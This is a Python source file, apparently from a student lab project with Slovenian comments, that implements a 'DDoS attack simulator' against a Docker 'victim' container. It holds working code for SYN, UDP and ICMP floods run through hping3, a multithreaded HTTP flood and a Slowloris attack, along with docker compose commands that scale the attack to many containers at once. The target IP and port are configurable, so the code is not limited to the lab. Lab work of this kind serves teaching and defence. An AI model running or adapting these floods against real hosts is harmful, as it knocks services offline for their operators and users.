"""
attacker.py -. DDoS attack simulator
Supports: SYN flood, UDP flood, HTTP flood, Slowloris, ICMP flood
Configurable via environment variables.

HOW TO RUN:
# 1) Zazeni SAMO victim + monitoring (brez napada)
docker compose up --build

# 2) Zazeni napad (HTTP flood, 1 attacker) - victim mora ze runnate!!!!!!
docker compose --profile attack up --build attacker

# 3) 3 napadalci naenkrat — the so called "distributed" del
docker compose --profile attack up --build --scale attacker=3


# 5) SYN flood (1 attacker)
docker compose --profile attack run --rm -e ATTACK_MODE=syn attacker

# 6) UDP flood
docker compose --profile attack run --rm -e ATTACK_MODE=udp attacker

# 7) ICMP flood (ping flood)
docker compose --profile attack run --rm -e ATTACK_MODE=icmp attacker

# 8) HTTP flood
docker compose --profile attack run --rm -e ATTACK_MODE=http attacker

# 9) Slowloris
docker compose --profile attack run --rm -e ATTACK_MODE=slowloris attacker

# 10) Samo attacker logi (brez victim spamaa)
docker compose --profile attack up --build attacker

# 11) Kill it: Ctrl+C -> docker compose --profile attack down

# 12) VSI MODI NAENKRAT - vsak container pozene vseh 5 modov paralelno
#    Ce nastavimo scale=10, dobimo 10 containerjev x 5 modov = tocno 50 napadov
#    PowerShell:  $env:ATTACK_MODE="all"; docker compose --profile attack up --build --scale attacker=10
#    Linux/Mac:   ATTACK_MODE=all docker compose --profile attack up --build --scale attacker=10

# 13) Izberi mode + scale naenkrat (npr. 5x SYN flood)
#    PowerShell:  $env:ATTACK_MODE="syn"; docker compose --profile attack up --build --scale attacker=5
#    Linux/Mac:   ATTACK_MODE=syn docker compose --profile attack up --build --scale attacker=5


VICTIM:
  - Container se mora imenovate "victim" (ali pa spremenite TARGET_IP)
  - Poslusatee more na portu 80 (ali pa spremenite TARGET_PORT)
  - Mora biti na istem Docker omrezju (ddos-net)

MONITORING:
  - Attacker posle loge na stdout z prefixom [attacker] - ce jih
    zelite parsati, isci vrstice ki se zacnejo z "[attacker]"
  - Za HTTP flood se vsake 5s izpise stevilo poslanih requestov
  - Za Slowloris se vsake 10s izpise stevilo aktivnih povezav
  - Napad se konca ko DURATION potece, potem attacker container crkne basically
  - Za vec attackov naenkrat:   docker compose up --scale attacker=3
"""

import os
import sys
import time
import socket
import threading
import subprocess

TARGET_IP   = os.getenv("TARGET_IP", "victim")      # ime/IP victim containerja
TARGET_PORT = int(os.getenv("TARGET_PORT", 80))       # port na keron victim poslusa?
MODE        = os.getenv("ATTACK_MODE", "syn")        # kere tip napada izveste?
DURATION    = int(os.getenv("DURATION", 30))             # koliko sekund naj napad traja
THREADS     = int(os.getenv("THREADS", 100))           # stevilo niti za HTTP flood
CONNS       = int(os.getenv("SLOWLORIS_CONNS", 200))   # stevilo povezav za Slowloris
WAIT_FOR_VICTIM = int(os.getenv("WAIT_FOR_VICTIM", 5))   # koliko casa cakamo da se victim zazene


def log(msg):
    print(f"[attacker] {msg}", flush=True)



# Preden zacnemo z napadom, moramo preveriti ali je victim container
# ze pripravljen in sprejema povezave. Ce ne bi tega naredili, bi se
# napad mogoce zagnal se preden bi victim sploh zacel delati, in bi
# vsi requesti tiho failali brez da bi vedeli zakaj.
# Poizkusamo se povezati na victim vsake pol sekunde. Ko uspemo,
# vemo da je pripravljen in lahko zacnemo z napadom.
# ---------------------------------------------------------------------------
def wait_for_target():
    log(f"Waiting up to {WAIT_FOR_VICTIM}s for victim ({TARGET_IP}:{TARGET_PORT}) ...")
    deadline = time.time() + WAIT_FOR_VICTIM
    while time.time() < deadline:
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.settimeout(2)
            s.connect((TARGET_IP, TARGET_PORT))
            s.close()
            log("Victim is reachable - starting attack.")
            return True
        except (socket.error, OSError):
            time.sleep(0.5)
    log("WARNING: Could not reach victim in time, attacking anyway...")
    return False



# 1) SYN FLOOD
# ---------------------------------------------------------------------------
# SYN flood je napad na transportnem nivoju (Layer 4). Ideja je, da posiljamo
# ogromno TCP SYN paketov (to je prve korak v TCP 3-way handshake), ampak
# nikoli ne dokoncamo handshake-a. Zrtev za vsak SYN paket rezervira vire
# (port, pomnilnik) in caka na zakljucek povezave, which never comes.
# Ko se tabela polodprtih povezav napolni, zrtev ne more vec sprejemati
# novih legitimnih povezav.
# Uporabljamo orodje hping3 z zastavico -S (SYN) in --flood (posiljaj
# najhitreje monzoo).

def syn_flood():
    log(f"Starting SYN flood for {DURATION}s ...")
    try:
        subprocess.run(
            ["hping3", "-S", "--flood", "-p", str(TARGET_PORT), TARGET_IP],
            timeout=DURATION,
            stdout=subprocess.DEVNULL,
            stderr=subprocess.PIPE,
        )
    except subprocess.TimeoutExpired:
        pass
    log("SYN flood finished.")


# 2) UDP FLOOD
# ---------------------------------------------------------------------------
# UDP flood je tudi Layer 4 napad. UDP je connectionless protokol, kar
# pomeni da ni handshakea sepravi ka se pakete posiljajo brez vzpostavitve
# povezave. Zrtev dobi ogromno UDP paketov, na katere mora reagirati
# Opet uporabljamo hping3, tokrat z --udp zastavico.

def udp_flood():
    log(f"Starting UDP flood for {DURATION}s ...")
    try:
        subprocess.run(
            ["hping3", "--udp", "--flood", "-p", str(TARGET_PORT), TARGET_IP],
            timeout=DURATION,
            stdout=subprocess.DEVNULL,
            stderr=subprocess.PIPE,
        )
    except subprocess.TimeoutExpired:
        pass
    log("UDP flood finished.")


# 3) ICMP FLOOD (Ping flood)
# ---------------------------------------------------------------------------
# ICMP flood poslje OGROMNOO ICMP Echo Request paketov (isto kak kda uporabimo "ping").
# Zrtev mora na vsakega odgovoriti z Echo Reply, kar porabi procesorski
# cas in pasovno sirino. To je eden najstarejsih DoS napadov, sicer ga dandanes vecina firewallow pretty easily blokira ampak it's good for our project.

def icmp_flood():
    log(f"Starting ICMP flood for {DURATION}s ...")
    try:
        subprocess.run(
            ["hping3", "--icmp", "--flood", TARGET_IP],
            timeout=DURATION,
            stdout=subprocess.DEVNULL,
            stderr=subprocess.PIPE,
        )
    except subprocess.TimeoutExpired:
        pass
    log("ICMP flood finished.")


# 4) HTTP FLOOD
# ---------------------------------------------------------------------------
# HTTP flood je napad na aplikacijskem nivoju (Layer 7). Za razliko od
# SYN/UDP floodov, tu posiljamo POPOLNOMA LEGITIMNE HTTP zahtevke.
# To pomeni da firewall tezko loci med napadom in normalnim prometom,
# ker so zahtevki videti enako kot od neksoga uporabnikka.
#
# Uporabljamo vec niti (threadov), sepravi ka vsaka nit v zanki odpre TCP povezavo,
# poslje GET request, pocaka na odgovor in zaprej povezavo. To ponavljamo
# dokler ne potece cas napada. Stevilo niti je nastavljivo (privzeto 100).
#
# Vsaka nit steje poslane requeste lokalno, na koncu pa se vse sesteje
# skupaj (z lockom, da ne pride do race conditionaa pri pisanju).
# Med napadom se vsakih 5 sekund izpise napredek (koliko requestov
# je bilo ze poslanih).

def http_flood():
    log(f"Starting HTTP flood for {DURATION}s with {THREADS} threads ...")
    counter_lock = threading.Lock()
    counter = [0]
    errors = [0]

    def worker():
        # Vsaka nit ima svoj lokalni stevev IN sele na konce pristeje
        # k skupnemu stevcu. Tako se izognemo konstantnemu lockiranju.
        end_time = time.time() + DURATION
        while time.time() < end_time:
            try:
                s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                s.settimeout(4)
                s.connect((TARGET_IP, TARGET_PORT))
                s.send(b"GET / HTTP/1.1\r\nHost: victim\r\nConnection: close\r\n\r\n")
                s.recv(512)
                s.close()
                with counter_lock:
                    counter[0] += 1
            except (socket.error, OSError):
                with counter_lock:
                    errors[0] += 1

    threads = [threading.Thread(target=worker, daemon=True) for _ in range(THREADS)]
    for t in threads:
        t.start()

    # napredek, every 5s
    start = time.time()
    while any(t.is_alive() for t in threads):
        time.sleep(5)
        elapsed = time.time() - start
        with counter_lock:
            current = counter[0]
            errs = errors[0]
        log(f"  HTTP flood progress: {current} sent, {errs} failed ({elapsed:.0f}s elapsed)")

    for t in threads:
        t.join()

    with counter_lock:
        total = counter[0]
        total_errs = errors[0]
    log(f"HTTP flood done - sent {total}, failed {total_errs} in {DURATION}s ({total/max(DURATION,1):.0f} req/s)")


# 5) SLOWLORIS
# ---------------------------------------------------------------------------
# Slowloris je zelo zvit napad, ker ne potrebuje veliko pasovne sirine,
# ampak lahko vseeno sesuje spletni streznik:

# 1. Odpremo veliko stevilo TCP povezav do zrtve (npr. 200)
# 2. Na vsaki povezavi zacnemo posiljati HTTP request, AMPAK ga
#    nikoli ne dokoncamo - posiljamo samo delne headerje (npr.
#    "X-a: b\r\n") vsakih nekaj sekund
# 3. Streznik drzi te povezave odprte, ker caka na zakljucek requesta
# 4. Ko se zasedejo vsi connection sloti, streznik ne more vec
#    sprejemati novih povezav - legitimni uporabniki ne morejo vec
#    dostopati do strani

# Ce kaksna povezava pade (timeout), jo poskusimo ponovno odpreti, da ohranjamo maksimalno stevilo aktivnih povezav ves cas napada.

def slowloris():
    log(f"Starting Slowloris for {DURATION}s with {CONNS} connections ...")
    sockets_list = []
    end_time = time.time() + DURATION

    # Najprej odpremo cim vec povezav do zrtve
    for i in range(CONNS):
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.settimeout(4)
            s.connect((TARGET_IP, TARGET_PORT))
            s.send(b"GET / HTTP/1.1\r\nHost: victim\r\n")
            sockets_list.append(s)
        except (socket.error, OSError):
            pass

    log(f"Holding {len(sockets_list)} connections open ...")

    while time.time() < end_time:
        for s in list(sockets_list):
            try:
                s.send(b"X-a: b\r\n")
            except (socket.error, OSError):
                sockets_list.remove(s)

        log(f"  Slowloris: {len(sockets_list)} active connections")
        time.sleep(10)

        # Ce smo zgubelee kakso povezavo, jo poskusimo nadomestiti
        while len(sockets_list) < CONNS and time.time() < end_time:
            try:
                s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                s.settimeout(4)
                s.connect((TARGET_IP, TARGET_PORT))
                s.send(b"GET / HTTP/1.1\r\nHost: victim\r\n")
                sockets_list.append(s)
            except (socket.error, OSError):
                break

    # vse odprejte sockete na konce zaprejmo
    for s in sockets_list:
        try:
            s.close()
        except (socket.error, OSError):
            pass

    log("Slowloris finished.")


# Slovar napadov
# ---------------------------------------------------------------------------
# Tukaj povezemo imena napadov z ustreznimi funkcijami. Ko uporabnik
# nastavi ATTACK_MODE v docker-compose, se iz tega slovarja poklice
# prava funkcija.

MODES = {
    "syn":       syn_flood,
    "udp":       udp_flood,
    "icmp":      icmp_flood,
    "http":      http_flood,
    "slowloris": slowloris,
}

if __name__ == "__main__":
    log("=" * 50)
    log(f"DDoS Attack Simulator")
    log(f"  Target  : {TARGET_IP}:{TARGET_PORT}")
    log(f"  Mode    : {MODE}")
    log(f"  Duration: {DURATION}s")
    log(f"  Threads : {THREADS} (HTTP) | Conns: {CONNS} (Slowloris)")
    log("=" * 50)

    # Ce je mode "all", ta container zažene VSEH 5 napadov hkrati.
    # Vsak napad tece v svojem threadu, vsi se izvajajo paralelno.
    # To pomeni, da ce uporabimo --scale attacker=10, dobimo:
    #   10 containerjev x 5 modov = tocno 50 napadov
    #   Vsak mode ima GARANTIRANO 10 instanc - ni nakljucja.
    #
    # Primer uporabe:
    #   PowerShell:  $env:ATTACK_MODE="all"; docker compose up --build --scale attacker=10
    #   Linux/Mac:   ATTACK_MODE=all docker compose up --build --scale attacker=10
    if MODE == "all":
        log("Mode 'all' -> zaganjam VSEH 5 napadov at the same time v tem containerju")
        wait_for_target()

        # Vsak napad zazenemo v loceni niti, tako da tecejo vsi hkrati
        attack_threads = []
        for name, func in MODES.items():
            log(f"  Zaganjam: {name}")
            t = threading.Thread(target=func, daemon=True)
            t.start()
            attack_threads.append(t)

        # Pocakamo da se vsi napadi zakljucijo (ko DURATION potece)
        for t in attack_threads:
            t.join()

        log("All attacks finished.")
        sys.exit(0)

    if MODE not in MODES:
        log(f"Unknown mode '{MODE}'. Available: {list(MODES.keys())} + ['all']")
        sys.exit(1)

    wait_for_target()
    MODES[MODE]()
    log("Attack finished.")